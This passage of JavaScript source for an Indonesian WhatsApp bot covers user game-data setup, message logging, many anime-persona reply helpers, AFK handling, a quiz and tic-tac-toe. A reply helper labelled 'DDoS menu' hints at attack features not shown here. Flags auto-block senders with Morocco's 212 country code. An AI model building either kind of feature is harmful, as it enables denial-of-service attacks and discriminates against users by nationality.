if (!isNumber(user.dogexp)) user.dogexp = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.roboexp)) user.roboexp = 0
if (!isNumber(user.horselastfeed)) user.horselastfeed = 0
if (!isNumber(user.catlastfeed)) user.catlastfeed = 0
if (!isNumber(user.robolastfeed)) user.robolastfeed = 0
if (!isNumber(user.foxlastfeed)) user.foxlastfeed = 0
if (!isNumber(user.doglastfeed)) user.doglastfeed = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.robodurability)) user.robodurability = 0
if (!isNumber(user.armor)) user.armor = 0
if (!isNumber(user.armordurability)) user.armordurability = 0
if (!isNumber(user.sword)) user.sword = 0
if (!isNumber(user.sworddurability)) user.sworddurability = 0
if (!isNumber(user.pickaxe)) user.pickaxe = 1
if (!isNumber(user.pickaxedurability)) user.pickaxedurability = 0
if (!isNumber(user.fishingrod)) user.fishingrod = 0
if (!isNumber(user.fishingroddurability)) user.fishingroddurability = 0
if (!user.premium) user.premiumTime = 0
if (!('afkReason' in user)) user.afkReason = ''
if (!("premium" in user)) user.premium = false
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
premiumTime: 0,
premium: false,
money: 100000,
exp: 0,
level: 1,
limit: 20,
freelimit: 0,
lastclaim: 0,
skata: 0,
registered: false,
name: m.name,
pc: 0,
joinlimit: 1,
age: -1,
regTime: -1,
unreg: false,
afk: -1,
afkReason: '',
banned: false,
bannedTime: 0,
warning: 0,
level: 0,
rokets: 0,
role: 'Beginner',
skill: '',
ojekk: 0,
WarnReason: '',
chip: 0,
bank: 0,
atm: 0,
fullatm: 0,
health: 1000,
potion: 10,
trash: 0,
wood: 0,
rock: 0,
string: 0,
emerald: 0,
diamond: 0,
gold: 0,
iron: 0,
common: 0,
uncommon: 0,
mythic: 0,
legendary: 0,
umpan: 0,
pet: 0,
horse: 0,
horseexp: 0,
horselastfeed: 0,
cat: 0,
catexp: 0,
catlastfeed: 0,
fox: 0,
foxexp: 0,
foxlastfeed: 0,
robo: 0,
roboexp: 0,
robolastfeed: 0,
dog: 0,
dogexp: 0,
doglastfeed: 0,
paus: 0,
kepiting: 0,
gurita: 0,
cumi: 0,
buntal: 0,
dory: 0,
lumba: 0,
lobster: 0,
hiu: 0,
udang: 0,
ikan: 0,
orca: 0,
banteng: 0,
harimau: 0,
gajah: 0,
kambing: 0,
buaya: 0,
kerbau: 0,
sapi: 0,
monyet: 0,
babi: 0,
ayam: 0,
armor: 1,
armordurability: 0,
sword: 1,
sworddurability: 0,
pickaxe: 1,
pickaxedurability: 0,
fishingrod: 0,
fishingroddurability: 0,
robo: 0,
robodurability: 0,
apel: 20,
pisang: 0,
anggur: 0,
mangga: 0,
jeruk: 0,
lastadventure: 0,
lastkill: 0,
lastmisi: 0,
lastdungeon: 0,
lastwar: 0,
lastsda: 0,
lastduel: 0,
lastmining: 0,
lasthunt: 0,
lastgift: 0,
lastberkebon: 0,
lastdagang: 0,
lasthourly: 0,
lastbansos: 0,
lastrampok: 0,
lastclaim: 0,
lastnebang: 0,
lastweekly: 0,
lastmonthly: 0

}


const setting = db.settings[botNumber]
        if (typeof setting !== 'object') db.settings[botNumber] = {}
	    if (setting) {
    	    if (!('anticall' in setting)) setting.anticall = false
    		if (!isNumber(setting.status)) setting.status = 0
    		if (!('autobio' in setting)) setting.autobio = false
    		if (!('autoread' in setting)) setting.autoread = true
        if (!('goodbye' in setting)) chats.goodbye = setting.auto_leaveMsg
        if (!('onlygrub' in setting)) setting.onlygrub = true
        if (!('onlypc' in setting)) setting.onlypc = false
        if (!('welcome' in setting)) chats.welcome = setting.auto_welcomeMsg
       if (!('onlygrub' in setting)) setting.onlygrub = true
	  } else global.db.settings[botNumber] = {
    	  anticall: false,
    		status: 0,
    		stock:10,
    		autobio: false,
    		autoread: true,
    		auto_ai_grup: false,
    		goodbye: false,
        onlygrub: false,
        onlypc: false,
        welcome: false, 
    		autoread: true
	    }
	    
	    	
} catch (err) {
console.error(err)
}

if (m.isGroup && isMute) {
if (!isAdmins && !isRyuuTheCreator) return
}


if (!RyuuBotz.public) {
if (!m.key.fromMe) return
}
if (db.settings[botNumber].autoread) {
            RyuuBotz.readMessages([m.key])
}
if (m.message && m.isGroup) {
     console.log(`
┌────────── [ GROUP CHAT LOG ] ──────────┐
│ 🕒 Time      : ${chalk.green(new Date().toISOString().slice(0, 19).replace('T', ' '))}
│ 📝 Message   : ${chalk.blue(budy || m.mtype)}
│ 👤 Sender    : ${chalk.magenta(pushname)} (${chalk.cyan(m.sender)})
│ 🏠 Group     : ${chalk.yellow(groupName)} (${chalk.cyan(m.chat)})
└────────────────────────────────────┘
    `);
} else {
    console.log(`
┌───────── [ PRIVATE CHAT LOG ] ─────────┐
│ 🕒 Time      : ${chalk.green(new Date().toISOString().slice(0, 19).replace('T', ' '))}
│ 📝 Message   : ${chalk.blue(budy || m.mtype)}
│ 👤 Sender    : ${chalk.magenta(pushname)} (${chalk.cyan(m.sender)})
└───────────────────────────────────┘
    `);
}

if (isCmd && !isUser) {
reinzmahiruverifikasiuser.push(sender)
fs.writeFileSync('./node_modules/Arisu-MD/database/user.json', JSON.stringify(reinzmahiruverifikasiuser, null, 2))
}

// Fungsi umum untuk mengirim balasan dengan contextInfo berisi ExternalAdReply dan Forwarded Info
async function reply(text) {
const thumbnails = [
        'https://files.catbox.moe/h9spy4.jpg',
        'https://files.catbox.moe/ghven4.jpg',
        'https://files.catbox.moe/9z6zif.jpg',
        'https://files.catbox.moe/wgnwyo.jpg',
        'https://files.catbox.moe/skqb0h.jpg'
    ];
    const randomThumb = thumbnails[Math.floor(Math.random() * thumbnails.length)];
    
    RyuuBotz.sendMessage(m.chat, {
        text,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            externalAdReply: {
                title: '' + global.botname,
                body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
                thumbnailUrl: '' + `${randomThumb}`,
                sourceUrl: 'https://instagram.com/reinzz311'
            }
        }
    }, { quoted: m });
}

const replyafk3 = (text) => {
  const thumbnails = [
        'https://files.catbox.moe/h9spy4.jpg',
        'https://files.catbox.moe/ghven4.jpg',
        'https://files.catbox.moe/9z6zif.jpg',
        'https://files.catbox.moe/wgnwyo.jpg',
        'https://files.catbox.moe/skqb0h.jpg'
    ];
    const randomThumbs = thumbnails[Math.floor(Math.random() * thumbnails.length)];
    RyuuBotz.sendMessage(m.chat, {
      text,
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        externalAdReply: {
          title: 'Jangan di ganggu kocak',
          body: `Menghilang cuyy`,
          thumbnailUrl: '' + `${randomThumbs}`,
          sourceUrl: 'https://instagram.com/reinzz311'
        }
      }
    }, { quoted: m });
};  
const replyafk2 = (text) => {
  const thumbnails = [
        'https://files.catbox.moe/h9spy4.jpg',
        'https://files.catbox.moe/ghven4.jpg',
        'https://files.catbox.moe/9z6zif.jpg',
        'https://files.catbox.moe/wgnwyo.jpg',
        'https://files.catbox.moe/skqb0h.jpg'
    ];
    const randomThumbs = thumbnails[Math.floor(Math.random() * thumbnails.length)];
    RyuuBotz.sendMessage(m.chat, {
      text,
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        externalAdReply: {
          title: 'Dia Kembali dari Afk',
          body: `Lah muncul lagi :v`,
          thumbnailUrl: '' + `${randomThumbs}`,
          sourceUrl: 'https://instagram.com/reinzz311'
        }
      }
    }, { quoted: m });
  };  
  const replyafk = (text) => {
  const thumbnails = [
        'https://files.catbox.moe/h9spy4.jpg',
        'https://files.catbox.moe/ghven4.jpg',
        'https://files.catbox.moe/9z6zif.jpg',
        'https://files.catbox.moe/wgnwyo.jpg',
        'https://files.catbox.moe/skqb0h.jpg'
    ];
    const randomThumbs = thumbnails[Math.floor(Math.random() * thumbnails.length)];
    RyuuBotz.sendMessage(m.chat, {
      text,
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        externalAdReply: {
          title: 'Dia mau Afk',
          body: `Dadahh`,
          thumbnailUrl: '' + `${randomThumbs}`,
          sourceUrl: 'https://instagram.com/reinzz311'
        }
      }
    });
  };  
const replyreinz = (text) => {
    RyuuBotz.sendMessage(m.chat, {
        text,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            externalAdReply: {
                title: '' + global.botname,
                body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
                thumbnailUrl: '' + global.replyreinz,
                sourceUrl: 'https://instagram.com/reinzz311'
            }
        }
    }, { quoted: m });
};

const replyReinzID = (text) => {
    RyuuBotz.sendMessage(m.chat, {
        text,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            externalAdReply: {
                title: '' + global.botname,
                body: `${ReinzIDliatwaktu} | ${pushname}`,
                thumbnailUrl: '' + global.replyReinzID,
                sourceUrl: 'https://instagram.com/reinzz311'
            }
        }
    }, { quoted: m });
};

const replyreinz4 = (text) => {
    RyuuBotz.sendMessage(from, { text }, { quoted: m });
};
const fsaluran = {
  key: {
    remoteJid: `${m.sender.split("@")[0]}@s.whatsapp.net`,
    participant: `${m.sender.split("@")[0]}@s.whatsapp.net`
  },
  message: {
    newsletterAdminInviteMessage: {
      newsletterJid: '120363419382206255@newsletter',
      newsletterName: global.ownername,
      caption: body
    }
  }
};
          ////Konstanta reply AI/////
const replyaoi = (text) => {
  RyuuBotz.sendMessage(m.chat, {
    text,
    contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
        title: 'Aoi-AI',
        body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
        thumbnailUrl: 'https://files.catbox.moe/gy0b0m.jpg',
        sourceUrl: 'https://instagram.com/reinzz311'
      }
    }
  }, { quoted: m });
}
const replyamelia = (text) => {
  RyuuBotz.sendMessage(m.chat, {
    text,
    contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
        title: 'Amelia-AI',
        body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
        thumbnailUrl: 'https://files.catbox.moe/tlv50f.jpg',
        sourceUrl: 'https://instagram.com/reinzz311'
      }
    }
  }, { quoted: m });
}
const replyiroha = (text) => {
  RyuuBotz.sendMessage(m.chat, {
    text,
    contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
        title: 'Iroha-AI',
        body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
        thumbnailUrl: 'https://files.catbox.moe/ii8hg1.jpg',
        sourceUrl: 'https://instagram.com/reinzz311'
      }
    }
  }, { quoted: m });
}
const replymongfa = (text) => {
  RyuuBotz.sendMessage(m.chat, {
    text,
    contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
        title: 'Mongfa-AI',
        body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
        thumbnailUrl: 'https://files.catbox.moe/96e0td.jpg',
        sourceUrl: 'https://instagram.com/reinzz311'
      }
    }
  }, { quoted: m });
}
const replykarin = (text) => {
  RyuuBotz.sendMessage(m.chat, {
    text,
    contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
        title: 'Karin-AI',
        body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
        thumbnailUrl: 'https://files.catbox.moe/jjbu7b.jpg', // ganti nanti
        sourceUrl: 'https://instagram.com/reinzz311'
      }
    }
  }, { quoted: m });
}
const replyitsuki = (text) => {
    RyuuBotz.sendMessage(m.chat, {
        text,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            externalAdReply: {
                title: 'Itsuki Nakano-AI',
                body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
                thumbnailUrl: 'https://files.catbox.moe/iwxe5y.jpg',
                sourceUrl: 'https://instagram.com/reinzz311'
            }
        }
    }, { quoted: m });
};
const replymiku = (text) => {
    RyuuBotz.sendMessage(m.chat, {
        text,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            externalAdReply: {
                title: 'Miku Nakano-AI',
                body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
                thumbnailUrl: 'https://files.catbox.moe/no85cx.jpg',
                sourceUrl: 'https://instagram.com/reinzz311'
            }
        }
    }, { quoted: m });
};
const replymegumi = (text) => {
    RyuuBotz.sendMessage(m.chat, {
        text,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            externalAdReply: {
                title: 'Megumi-AI',
                body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
                thumbnailUrl: 'https://files.catbox.moe/mhes0q.jpg',
                sourceUrl: 'https://instagram.com/reinzz311'
            }
        }
    }, { quoted: m });
};
const replyryuichi = (text) => {
    RyuuBotz.sendMessage(m.chat, {
        text,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            externalAdReply: {
                title: 'Ryuichi-AI',
                body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
                thumbnailUrl: 'https://files.catbox.moe/364bqh.jpg',
                sourceUrl: 'https://instagram.com/reinzz311'
            }
        }
    }, { quoted: m });
};
const replyyuno = (text) => {
    RyuuBotz.sendMessage(m.chat, {
        text,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            externalAdReply: {
                title: 'Yuno-AI',
                body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
                thumbnailUrl: 'https://files.catbox.moe/jcmzii.jpg',
                sourceUrl: 'https://instagram.com/reinzz311'
            }
        }
    }, { quoted: m });
};

const replysilver = (text) => {
    RyuuBotz.sendMessage(m.chat, {
        text,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            externalAdReply: {
                title: 'SilverWolf-AI',
                body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
                thumbnailUrl: 'https://files.catbox.moe/35jyc1.jpg',
                sourceUrl: 'https://instagram.com/reinzz311'
            }
        }
    }, { quoted: m });
};

const replyelaina = (text) => {
    RyuuBotz.sendMessage(m.chat, {
        text,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            externalAdReply: {
                title: 'Elaina-AI',
                body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
                thumbnailUrl: 'https://files.catbox.moe/j6uoif.jpg',
                sourceUrl: 'https://instagram.com/reinzz311'
            }
        }
    }, { quoted: m });
};

const replyalya = (text) => {
    RyuuBotz.sendMessage(m.chat, {
        text,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            externalAdReply: {
                title: 'Alya-AI',
                body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
                thumbnailUrl: 'https://files.catbox.moe/88guym.jpg',
                sourceUrl: 'https://instagram.com/reinzz311'
            }
        }
    }, { quoted: m });
};

const replyshiroko = (text) => {
    RyuuBotz.sendMessage(m.chat, {
        text,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            externalAdReply: {
                title: 'Shiroko-AI',
                body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
                thumbnailUrl: 'https://files.catbox.moe/286yid.jpg',
                sourceUrl: 'https://instagram.com/reinzz311'
            }
        }
    }, { quoted: m });
};
const replyayaka = (text) => {
    RyuuBotz.sendMessage(m.chat, {
        text,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            externalAdReply: {
                title: 'Ayaka-AI',
                body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
                thumbnailUrl: 'https://files.catbox.moe/aijh19.jpg',
                sourceUrl: 'https://instagram.com/reinzz311'
            }
        }
    }, { quoted: m });
};
const replykurumi = (text) => {
    RyuuBotz.sendMessage(m.chat, {
        text,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            externalAdReply: {
                title: 'Kurumi-AI',
                body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
                thumbnailUrl: 'https://files.catbox.moe/4emilh.jpg',
                sourceUrl: 'https://instagram.com/reinzz311'
            }
        }
    }, { quoted: m });
};

const replyhutao = (text) => {
    RyuuBotz.sendMessage(m.chat, {
        text,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            externalAdReply: {
                title: 'Hutao-AI',
                body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
                thumbnailUrl: 'https://files.catbox.moe/d3f68f.jpg',
                sourceUrl: 'https://instagram.com/reinzz311'
            }
        }
    }, { quoted: m });
};
        const replyddos = (text) => {
  RyuuBotz.sendMessage(m.chat, {
    text,
    contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
        title: 'DDoS menu',
        body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
        thumbnailUrl: '' + global.reply,
        sourceUrl: 'https://instagram.com/reinzz311'
      }
    }
  }, { quoted: m })
};
const replymahiru = (text) => {
    const thumbnails = [
        'https://files.catbox.moe/640u8a.jpg',
        'https://files.catbox.moe/9b3deg.jpeg',
        'https://files.catbox.moe/kra4hp.jpg',
        'https://files.catbox.moe/20x60h.jpg',
        'https://files.catbox.moe/de6jzh.jpg'
    ];
    const randomThumb = thumbnails[Math.floor(Math.random() * thumbnails.length)];

    RyuuBotz.sendMessage(m.chat, {
        text,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            externalAdReply: {
                title: 'Mahiru-AI',
                body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
                thumbnailUrl: randomThumb,
                sourceUrl: 'https://instagram.com/reinzz311'
            }
        }
    }, { quoted: m });
};
const replyhanako = (text) => {
    const thumbnails = [
        "https://files.catbox.moe/gr48l6.jpg",
        "https://files.catbox.moe/ulx83d.jpg",
        "https://files.catbox.moe/d5o6f5.jpg",
        "https://files.catbox.moe/x9grtt.jpg",
        "https://files.catbox.moe/7ll7fn.jpg"
    ];
    const randomThumb = thumbnails[Math.floor(Math.random() * thumbnails.length)];

    RyuuBotz.sendMessage(m.chat, {
        text,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            externalAdReply: {
                title: 'Hanako-AI',
                body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
                thumbnailUrl: randomThumb,
                sourceUrl: 'https://instagram.com/reinzz311'
            }
        }
    }, { quoted: m });
};
const replyarisu = (text) => {
  const thumbnails = [
        'https://files.catbox.moe/h9spy4.jpg',
        'https://files.catbox.moe/ghven4.jpg',
        'https://files.catbox.moe/9z6zif.jpg',
        'https://files.catbox.moe/wgnwyo.jpg',
        'https://files.catbox.moe/skqb0h.jpg'
    ];
    const randomThumbs = thumbnails[Math.floor(Math.random() * thumbnails.length)];
    RyuuBotz.sendMessage(m.chat, {
      text,
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        externalAdReply: {
          title: 'Arisu AI',
          body: `ᴇxᴘᴇʀɪᴍᴇɴᴛs ᴀʀᴇ ᴍʏ ᴄᴏᴍғᴏʀᴛ ᴢᴏɴᴇ.. Reinzz?`,
          thumbnailUrl: '' + `${randomThumbs}`,
          sourceUrl: 'https://instagram.com/reinzz311'
        }
      }
    }, { quoted: m });
  };
  if (/(^|\W)(arisu|tendou)(\W|$)/i.test(` ${text} `)) {
  if (m.key.fromMe) return

  const senseiNumb = global.ownernomer
  if (m.sender === `${senseiNumb}@s.whatsapp.net`) {
    replyarisu('Hehehe~ Ryuu-Sensei nyariin aku ya? 💖')
  } else {
    replyarisu('Kamu nyariin aku? 😊')
  }
}
try {
  if (typeof m.text === 'string' && new RegExp(`@${global.ownernomer}`, 'i').test(m.text)) {
    if (!isRyuuTheCreator) {
      const stickerBuffer = await fs.readFileSync('./node_modules/Arisu-MD/stiker/apa-woi.webp'); // path lokal ke stiker
      await RyuuBotz.sendImageAsSticker(
        m.chat,
        stickerBuffer,
        m,
        {
          packname: `Jangan tag owner ku 😡`
        },
        {
          quoted: m
        }
      );
    }
  }
} catch (err) {
  console.error('Error saat mengirim stiker:', err);
  reply(`Owner ku pusing anj😭\n*Error:* ${err.message}`);
}
if (!m.isGroup && global.ArisuBot && !m.key.fromMe && m.sender === m.chat) {
const arisuai = require('./command/arisu-auto');
  await arisuai(m, text, prefix, command, replyarisu, RyuuBotz)
}
/*  if (/(^|\W)(ayaka|kamisato)(\W|$)/i.test(` ${text} `)) {
  if (m.key.fromMe) return // abaikan pesan yang dikirim oleh bot sendiri

  const senseiNumb = global.ownernomer
  if (m.sender === `${senseiNumb}@s.whatsapp.net`) {
    replyayaka('Hehehe~ Ryuu-san nyariin aku ya? 💖, kalau mau chat pakai command .ayaka aja')
  } else {
    replyayaka('Ada yang nyariin aku? 😊')
  }
}*/
/*===============BATAS====================*/

RyuuBotz.sendPresenceUpdate('unavailable', from)

for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
replyafk3(`Jangan Tag Dia!
Dia AFK ${reason ? 'With Reason: ' + reason : 'No Reason'}
During ${clockString(new Date - afkTime)}
`.trim())
}

//math
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {

            kuis = true

            jawaban = kuismath[m.sender.split('@')[0]]

            if (budy.toLowerCase() == jawaban) {

await reply(`🎮 Kuis Matematika 🎮\tidak ada Jawaban Benar 🎉\dan Mau Main Lagi? Mengirim ${prefix}math mode`)

delete kuismath[m.sender.split('@')[0]]

            } else reply('*Wrong Answer!*')

        }


//TicTacToe\\
	    this.game = this.game ? this.game : {}
	    let room13 = Object.values(this.game).find(room13 => room13.id && room13.game && room13.state && room13.id.startsWith('tictactoe') && [room13.game.playerX, room13.game.playerO].includes(m.sender) && room13.state == 'PLAYING')
	    if (room13) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    //reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room13.game.currentTurn) { 
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room13.game.turn(m.sender === room13.game.playerO, parseInt(m.text) - 1))) {
	    reply({
	    '-3': 'Permainan Telah Berakhir',
	    '-2': 'Tidak sah',
	    '-1': 'Posisi Tidak Valid',
	    0: 'Posisi Tidak Valid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room13.game.winner) isWin = true
	    else if (room13.game.board === 511) isTie = true
	    let arr = room13.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room13.game._currentTurn = m.sender === room13.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room13.game.currentTurn : room13.game.winner
	    let str = `room13 ID: ${room13.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Win!` : isTie ? `Game Over` : `Turn ${['❌', '⭕'][1 * room13.game._currentTurn]} (@${room13.game.currentTurn.split('@')[0]})`}
❌: @${room13.game.playerX.split('@')[0]}
⭕: @${room13.game.playerO.split('@')[0]}

Ketik *surrender* untuk menyerah dan mengaku kalah`
	    if ((room13.game._currentTurn ^ isSurrender ? room13.x : room13.o) !== m.chat)
	    room13[room13.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room13.x !== room13.o) await RyuuBotz.sendText(room13.x, str, m, { mentions: parseMention(str) } )
	    await RyuuBotz.sendText(room13.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room13.id]
	    }
	    }


	    
  
function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
replyafk2(`
You Quit AFK${user.afkReason ? ' After: ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

		// auto set bio
	if (db.settings[botNumber].autobio) {
	    let setting = global.db.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await RyuuBotz.updateProfileStatus(`${RyuuBotz.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}

//autoblock 212
if (global.autoblockmorroco) {
if (m.sender.startsWith('212')) return RyuuBotz.updateBlockStatus(m.sender, 'block')
}

//autokick 212
if (global.autokickmorroco) {
if (m.isGroup && m.sender.startsWith('212')) return 
}


//antispam kick
if (global.antispam) {
if (m.isGroup && m.message && msgFilter.isFiltered(from)) {
console.log(`${global.themeemoji}[SPAM]`, color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))
return await RyuuBotz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}


function roundRect(ctx, x, y, width, height, radius, fill, stroke) {
  if (typeof stroke === 'undefined') stroke = true
